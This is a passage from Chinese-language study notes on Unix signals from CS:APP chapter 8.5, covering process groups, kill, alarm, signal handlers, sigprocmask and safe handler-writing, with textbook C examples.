alt="image-20220611191313999"></p><p>按下<code>Ctrl+C</code>，内核将会发送<code>SIGINT</code>信号给前台进程组的每个进程。</p><p>一个进程可以通过向另一个进程发送<code>SIGKILL</code>信号强制终止它。</p><p>当一个子进程终止或停止时，内核会发送一个<code>SIGCHLD</code>信号给父进程</p><h4 id="8-5-1-信号术语"><a href="#8-5-1-信号术语" class="headerlink" title="8.5.1 信号术语"></a>8.5.1 信号术语</h4><p>传送信号到目的进程的步骤：</p><ul><li>发送信号。内核通过更新目的进程上下文中的某个状态，发送（递送）一个信号给目的进程。</li><li>接收信号。当目的进程被内核强迫以某种方式对信号的发送做出反应时，它就接收了信号。进程可以忽略这个信号，终止或者通过执行一个称为信号处理程序的用户层函数捕获这个信号</li></ul><p>没有被接收的信号称之为待处理信号，一种信号至多只有一个待处理信号，若此时接收了相同类型的信号则直接抛弃，不会进行排队等号。</p><p>进程可以有选择性的阻塞接收某种信号。当一种信号被阻塞时，它仍可以被发送，但是产生的待处理信号不会被接收，直到进程取消对这种信号的阻塞。</p><h4 id="8-5-2-发送信号"><a href="#8-5-2-发送信号" class="headerlink" title="8.5.2 发送信号"></a>8.5.2 发送信号</h4><p><code>Unix</code>系统提供了向进程发送信号的机制，这些机制都是基于进程组概念。</p><p><strong>1.进程组</strong></p><p>每个进程都只属于一个进程组，进程组由一个正整数进程组ID标识。</p><p><code>getpgrp</code>函数返回当前进程的进程组<code>ID</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">getpgrp</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-comment">//返回：调用进程的进程组ID</span><br></code></pre></td></tr></table></figure><p>默认条件下，子进程与它的父进程同属于一个进程组。</p><p>进程可以通过<code>setpgid</code>函数改变自己或其他进程的进程组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">setpgid</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">pid_t</span> pgid)</span>;<br><span class="hljs-comment">//成功则返回0，错误则为-1</span><br></code></pre></td></tr></table></figure><ul><li>若<code>pid</code>为0，则使用当前进程的<code>PID</code></li><li>若<code>pgid</code>为0，则使用<code>pid</code>指定的进程的<code>PID</code>作为进程组<code>ID</code></li></ul><p><strong>2. 用&#x2F;bin&#x2F;kill程序发送信号</strong></p><p><code>/bin/kill</code>程序可以向另外的进程发送任意的信号</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">linux&gt; </span><span class="language-bash">/bin/kill -9 15213</span><br></code></pre></td></tr></table></figure><p>发送一个<code>SIGKILL</code>信号给进程15213</p><p>负的<code>PID</code>则会将信号被发送到进程组<code>PID</code>中的每个进程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">linux&gt; </span><span class="language-bash">/bin/kill -9 -15213</span><br></code></pre></td></tr></table></figure><p>发送一个<code>SIGKILL</code>信号给进程组15213中的每个进程</p><p><strong>3.从键盘发送信号</strong></p><p><code>Unix shell</code>使用作业表示为对一条命令行求值而创建的进程。</p><p>至多只有一个前台作业或0个或多个后台作业。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">linux&gt; </span><span class="language-bash"><span class="hljs-built_in">ls</span> | <span class="hljs-built_in">sort</span></span><br></code></pre></td></tr></table></figure><p>上述命令会创建一个由两个进程组成的前台作业，这两个进程是通过<code>Unix</code>管道连接起来</p><p><code>shell</code>为每个作业创建一个独立的进程组，进程组<code>ID</code>通常取父进程的<code>PID</code></p><p><img src="https://s2.loli.net/2022/06/11/a5PKihr2qIzn1GM.png" alt="image-20220611205347003"></p><p><code>Ctrl + C</code>往前台进程组发送<code>SIGINT</code>信号，终止前台作业</p><p><code>Ctrl + z</code>往前台进程发送<code>SIGTSTP</code>信号，挂起前台作业</p><p><strong>4.用kill函数发送信号</strong></p><p>进程通过调用<code>kill</code>函数发送洗脑给其他进程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kill</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">int</span> sig)</span>;<br></code></pre></td></tr></table></figure><ul><li><p><code>pid&gt;0</code>，这<code>kill</code>函数发送信号号码<code>sig</code>给进程<code>pid</code></p></li><li><p><code>pid = 0</code>，则<code>kill</code>函数发送信号<code>sig</code>给调用进程所在进程组中的每个进程，包括调用进程自己</p></li><li><p><code>pid &lt; 0</code>，<code>kill</code>函数发送信号<code>sig</code>给进程组<code>pid</code>中的每个进程</p></li></ul><p><strong>kill.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;csapp.h&quot;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">pid_t</span> pid;<br><span class="hljs-keyword">if</span>((pid = Fork()) == <span class="hljs-number">0</span>)&#123;<br>Pause();<span class="hljs-comment">//休眠进程等待信号</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;control should never reach here!\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br>Kill(pid,SIGKILL);<span class="hljs-comment">//给子进程发送杀死进程的信号</span><br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>5.用alarm函数发送信号</strong></p><p>进程可以通过<code>alarm</code>函数向它自己发送<code>SIGALRM</code>信号</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">alarm</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> secs)</span>;<br></code></pre></td></tr></table></figure><p><code>alarm</code>被称为闹钟函数，可以在进程中设置一个定时器，当定时器指定的时间到时，它向进程发送<code>SIGALRM</code>信号，其动作是终止调用该<code>alarm</code>函数的进程</p><h4 id="8-5-3-接收信号"><a href="#8-5-3-接收信号" class="headerlink" title="8.5.3 接收信号"></a>8.5.3 接收信号</h4><p>当进程从内核态转化为用户态时，内核会检测进程是否存在未被阻塞且待处理信号的集合。若有则内核会选择某个信号（通常为最小值的信号），并且强制进程接收信号。</p><p>进程接收信号后会采取某种行为，每个信号都有一个预定义的默认行为</p><ul><li>进程终止</li><li>进程终止并转储内存</li><li>进程停止（挂起）直到被<code>SIGCONT</code>信号重启</li><li>进程忽略该信号</li></ul><p>信号的默认行为可以通过<code>signal</code>函数修改，除了<code>SIGSTOP</code>和<code>SIGKILL</code>信号不能被修改</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">void</span> <span class="hljs-params">(*<span class="hljs-type">sighandler_t</span>)</span><span class="hljs-params">(<span class="hljs-type">int</span>)</span>;<br><br><span class="hljs-type">sighandler_t</span> <span class="hljs-title function_">signal</span><span class="hljs-params">(<span class="hljs-type">int</span> signum,<span class="hljs-type">sighandler_t</span> handler)</span>;<br><br><span class="hljs-comment">//返回：若成功则为指向前次处理程序的指针，出错则为SIG_ERR</span><br></code></pre></td></tr></table></figure><p><code>signal</code>函数可以通过三种方法来修改和信号<code>signum</code>相关联的行为</p><ul><li><code>handler</code>是<code>SIG_IGN</code>，那么忽略类型为<code>signum</code>的信号</li><li><code>handler</code>是<code>SIG_DFL</code>，那么类型为<code>signum</code>的信号行为恢复为默认行为（处理信号）</li><li>否则，<code>handler</code>就是用户定义的函数的地址，这个函数被称为信号处理程序，只要进程接收到一个类型为<code>signum</code>的信号，就会调用这个程序。通过把处理程序的地址传递给<code>signal</code>函数从而改变默认行为，这叫设置信号处理程序。调用信号处理程序被称为捕获信号。执行信号处理程序被称为处理信号。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;csapp.h&quot;</span></span><br><br><span class="hljs-comment">//捕获到SIGINT信号的处理函数</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">sigint_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nCaught SIGINT!\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-keyword">if</span>(signal(SIGINT,sigint_handler) == SIG_ERR)<br>unix_error(<span class="hljs-string">&quot;signal error&quot;</span>);<br>pause(); <span class="hljs-comment">//挂起进程直到收到信号</span><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="8-5-4-阻塞和解除阻塞信号"><a href="#8-5-4-阻塞和解除阻塞信号" class="headerlink" title="8.5.4 阻塞和解除阻塞信号"></a>8.5.4 阻塞和解除阻塞信号</h4><p>Linux提供阻塞信号的隐式和显式的机制：</p><ul><li>隐式阻塞机制。内核默认阻塞任何当前处理程序正在处理信号类型的待处理的信号。即每个信号都有对应的信号处理程序，在该信号处理程序执行时会默认阻塞该信号</li><li>显示阻塞机制。应用程序可以使用<code>sigprocmask</code>函数和它的辅助函数，明确地阻塞和解除阻塞选定的信号</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;signal.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">sigprocmask</span><span class="hljs-params">(<span class="hljs-type">int</span> how,<span class="hljs-type">const</span> <span class="hljs-type">sigset_t</span> *<span class="hljs-built_in">set</span>, <span class="hljs-type">sigset_t</span> *oldset)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">sigemtyset</span><span class="hljs-params">(<span class="hljs-type">sigset_t</span> *<span class="hljs-built_in">set</span>)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">sigfillset</span><span class="hljs-params">(<span class="hljs-type">sigset_t</span> *<span class="hljs-built_in">set</span>,<span class="hljs-type">int</span> signum)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">sigdelset</span><span class="hljs-params">(<span class="hljs-type">sigset_t</span> *<span class="hljs-built_in">set</span>, <span class="hljs-type">int</span> signum)</span>;<br><span class="hljs-comment">//成功则返回0，出错则为-1</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">sigismember</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">sigset_t</span> *<span class="hljs-built_in">set</span>,<span class="hljs-type">int</span> signum)</span>;<br><span class="hljs-comment">//若signum是set的成员则为1，不是则为0，出错则为-1</span><br><br></code></pre></td></tr></table></figure><p><code>sigprocmask</code>函数改变当前阻塞的信号集合，具体行为依赖于<code>how</code>的值</p><ul><li><code>SIG_BLOCK</code>：把<code>set</code>中的信号添加到<code>blocked</code>中（<code>blocked=blocked | set</code>）</li><li><code>SIG_UNBOCK</code>：从<code>blocked</code>中删除<code>set</code>中的信号(<code>blocked = blocked &amp; ~set</code>)</li><li><code>SIG_SETMASK</code>：<code>block = set</code></li></ul><p>如果<code>oldset</code>非空，那么<code>blocked</code>位向量之前的值保存在<code>oldset</code>中</p><p>对<code>set</code>信号集合进行操作的函数</p><ul><li><code>sigemptyset</code>初始化<code>set</code>为空集合</li><li><code>sigfillset</code>函数把每个信号都添加到<code>set</code>中</li><li><code>sigaddset</code>函数把<code>signum</code>添加到<code>set</code></li><li><code>sigdelset</code>从<code>set</code>中删除<code>signum</code></li></ul><p><code>sigprocmask</code>临时阻塞接收<code>SIGINT</code>信号</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">sigset_t</span> mask,prev_mask;<br>Sigemptyset(&amp;mask);<br>Sigaddset(&amp;mask,SIGINT);<br><br><span class="hljs-comment">//将修改之前的信号存放在prev_mask中</span><br>Sigprocmask(SIG_BLOCK,&amp;mask,&amp;prev_mask);<br><br><span class="hljs-comment">//还原之前的设置</span><br>Sigprocmask(SIG_SETMASK,&amp;prev_mask,<span class="hljs-literal">NULL</span>);<br><br></code></pre></td></tr></table></figure><h4 id="8-5-5-编写信号处理程序"><a href="#8-5-5-编写信号处理程序" class="headerlink" title="8.5.5 编写信号处理程序"></a>8.5.5 编写信号处理程序</h4><p><strong>1.安全的信号处理</strong></p><p>信号处理程序由于是与主程序以及其他信号处理程序并发地允许，因此可以并发地访问同样地全局数据结构，那么可能会造成不可预知地问题。</p><p>编写处理程序的原则</p><ul><li>处理程序要尽可能简单</li><li>在处理程序中只调用异步信号安全的函数。<ul><li>异步信号安全的函数是可重入的（只访问局部变量）</li><li>异步信号安全的函数不能被信号处理程序中断</li></ul></li></ul><p><strong>异步信号安全的函数</strong></p><p>信号处理程序中产生输出唯一安全的方法是使用<code>write</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;csapp.h&quot;</span></span><br><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">sio_putl</span><span class="hljs-params">(<span class="hljs-type">long</span> v)</span>;<br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">sio_puts</span><span class="hljs-params">(<span class="hljs-type">char</span> s[])</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">sio_error</span><span class="hljs-params">(<span class="hljs-type">char</span> s[])</span>;<br></code></pre></td></tr></table></figure><p><strong>code&#x2F;src&#x2F;csapp.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">sio_puts</span><span class="hljs-params">(<span class="hljs-type">char</span> s[])</span><br>&#123;<br>    <span class="hljs-comment">//sio_strlen函数返回字符串s的长度</span><br>    <span class="hljs-keyword">return</span> write(STDOUT_FILENO,s,sio_strlen(s));<br>&#125;<br><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">sio_putl</span><span class="hljs-params">(<span class="hljs-type">long</span> v)</span><br>&#123;<br>    <span class="hljs-type">char</span> s[<span class="hljs-number">128</span>];<br>    <br>    <span class="hljs-comment">//长整形转化为任意进制的字符串</span><br>    sio_ltoa(v,s,<span class="hljs-number">10</span>);<br>    <span class="hljs-keyword">return</span> sio_puts(s);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">sio_error</span><span class="hljs-params">(<span class="hljs-type">char</span> s[])</span><br>&#123;<br>    sio_puts(s);<br>    _exit(<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>SIGINT</strong>处理程序的安全版本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;csapp.h&quot;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">sigint_handle</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span><br>&#123;<br>    Sio_puts(<span class="hljs-string">&quot;Caught SIGINT!\n&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>保存和恢复<code>errno</code>。由于众多<code>Linux</code>异步信号安全的函数都会在出错返回时设置<code>errno</code>。由于处理程序可能会干扰其他主程序中其他依赖于<code>errno</code>。因此解决办法为是在进入处理程序时将<code>errno</code>保存在一个局部变量中，在处理程序返回前恢复</li><li>阻塞所有的信号，保护对共享全局数据结构的访问。</li><li>用<code>volatile</code>声明全局变量。若用处理程序和<code>main</code>函数共享一个全局变量<code>g</code>，由于<code>main</code>周期性读<code>g</code>。一个优化的编译器会使用缓存在寄存器中的<code>g</code>的副本来满足对<code>g</code>对每次引用。则导致<code>main</code>无法读取<code>g</code>更新过的值<ul><li><code>volatile</code>类型限定符来定义一个变量，告诉编译器不要缓存这个变量。强迫编译器每次在代码中引用<code>g</code>时，都要从内存中读取。</li></ul></li><li>用<code>sig_atomic_t</code>声明标志。处理程序通过写全局标志来记录收到的信号。主程序周期性地读这个标志，响应信号，再清除标志。对于通过这种方式来共享地标志，<code>C</code>提供一种整型数据类型<code>sig_atomic_t</code>，并且该类型的读写是保证是原子操作</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">volatile</span> <span class="hljs-type">sig_atomic_t</span> flag;<br></code></pre></td></tr></table></figure><p><strong>2. 正确的信号处理</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;csapp.h&quot;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">handler1</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span><br>&#123;<br><span class="hljs-type">int</span> olderrno = errno;<br><br><span class="hljs-keyword">if</span>((waitpid(<span class="hljs-number">-1</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>)<br>sio_error(<span class="hljs-string">&quot;waitpid error&quot;</span>);<br>Sio_puts(<span class="hljs-string">&quot;Handler reaped child\n&quot;</span>);<br>Sleep(<span class="hljs-number">1</span>);<br>errno = olderrno;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> i,n;<br><span class="hljs-type">char</span> buf[MAXBUF];<br><br><span class="hljs-keyword">if</span>(signal(SIGCHLD,handler1) == SIG_ERR)<br>unix_error(<span class="hljs-string">&quot;signal error&quot;</span>);<br><br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++)&#123;<br><span class="hljs-keyword">if</span>(Fork() == <span class="hljs-number">0</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello from child %d\n&quot;</span>,(<span class="hljs-type">int</span>)getpid());<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>((n = read(STDIN_FILENO,buf,<span class="hljs-keyword">sizeof</span>(buf))) &lt; <span class="hljs-number">0</span>)<br>unix_error(<span class="hljs-string">&quot;read&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Parent processing input\n&quot;</span>);<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>;<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>上述程序会导致僵尸进程。父进程接收并捕获了第一个信号，当处理程序还在处理第一个程序时，第二个信号就传送并添加到待处理信号集合里，然而，因为<code>SIGCHLD</code>信号被<code>SIGCHLD</code>处理程序阻塞了，所以第二个信号不会被接收，因此再第三个信号时，该信号会被抛弃，导致进程未被收回。</p><p><strong>code&#x2F;ecf&#x2F;signal2.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">handler2</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span><br>&#123;<br>    <span class="hljs-type">int</span> olderrno = errno;<br>    <span class="hljs-comment">//将所有子进程都回收，则不会导致有僵尸进程</span><br>    <span class="hljs-keyword">while</span>(waitpid(<span class="hljs-number">-1</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>)&gt;<span class="hljs-number">0</span>)&#123;<br>        Sio_puts(<span class="hljs-string">&quot;Handler reaped child\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(errno != ECHILD)<br>        Sio_error(<span class="hljs-string">&quot;waitpid error&quot;</span>);<br>    Sleep(<span class="hljs-number">1</span>);<br>    errno = olderrno;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>练习题8.8</strong></p><p>下面这个程序的输出是什么？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">volatile</span> <span class="hljs-type">long</span> counter = <span class="hljs-number">2</span>;<br><br><span class="hljs-comment">//子进程调用信号处理函数</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">handler1</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span><br>&#123;<br>    <span class="hljs-type">sigset_t</span> mask,prev_mask;<br>    <span class="hljs-comment">//将所有信号放进mask里</span><br>    Sigfillset(&amp;mask);<span class="hljs-comment">//将信号都放进mask中</span><br>    <span class="hljs-comment">//临时阻塞所有信号</span><br>    Sigprocmask(SIG_BLOCK,&amp;mask,&amp;prev_mask);<br>    <span class="hljs-comment">//此时是子进程取出它自己的counter变量</span><br>    Sio_putl(--counter);<span class="hljs-comment">//打印1</span><br>    <span class="hljs-comment">//还原信号</span><br>    Sigprocmask(SIG_SETMASK,&amp;prev_mask,<span class="hljs-literal">NULL</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">pid_t</span> pid;<br>    <span class="hljs-type">sigset_t</span> mask,prev_mask;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%ld&quot;</span>,counter);<span class="hljs-comment">//用户打印2</span><br>    fflush(<span class="hljs-built_in">stdout</span>);<br>    <br>    signal(SIGUSR1,handler1); <span class="hljs-comment">//用户定义的信号1</span><br>    <span class="hljs-keyword">if</span>((pid = Fork()) == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;&#125;; <span class="hljs-comment">//死循环</span><br>    &#125;<br>    Kill(pid,SIGUSR1);<span class="hljs-comment">//父进程给子进程发送用户定义的信号1</span><br>    Waitpid(<span class="hljs-number">-1</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-comment">//将所有信号放进mask里</span><br>    Sigfillset(&amp;mask);<br>    Sigprocmask(SIG_BLOCK,&amp;mask,&amp;prev_mask);<br>    <span class="hljs-comment">//此时是父进程取出它自己的counter变量</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%ld&quot;</span>,++counter);<span class="hljs-comment">//打印3</span><br>    Sigprocmask(SIG_SETMASK,&amp;prev_mask,<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>输出213</p><p><strong>3.可移植的信号处理</strong></p><p><code>Unix</code>信号处理的另一个缺陷在于不同的系统有不同的信号处理语义</p><ul><li><code>signal</code>函数的语义各有不同。在有些老的<code>Unix</code>系统在信号<code>k</code>被处理程序捕获之后就把对信号<code>k</code>的反应恢复到默认值。因此在这些系统上，每次运行之后，处理程序必须调用<code>signal</code>函数，显示地重新设置。</li><li>系统调用可以被中断。像<code>read</code>、<code>write</code>和<code>accept</code>这样的系统调用潜在地会阻塞进程一段时间，称之为慢速系统调用。在老的<code>Unix</code>系统中，当处理程序捕获到一个信号时，被中断地慢速系统调用在信号处理程序返回时不再继续，而是立即返回给用户一个错误条件，并将<code>errno</code>设置为<code>EINTR</code>，因此在这些系统上程序员需要手动重启被中断的系统调用的代码。</li></ul><p><code>sigaction</code>函数允许用户在设置信号处理时，明确指定他们想要的信号处理语义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;signal.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">sigaction</span><span class="hljs-params">(<span class="hljs-type">int</span> signum,<span class="hljs-keyword">struct</span> sigaction *atc, <span 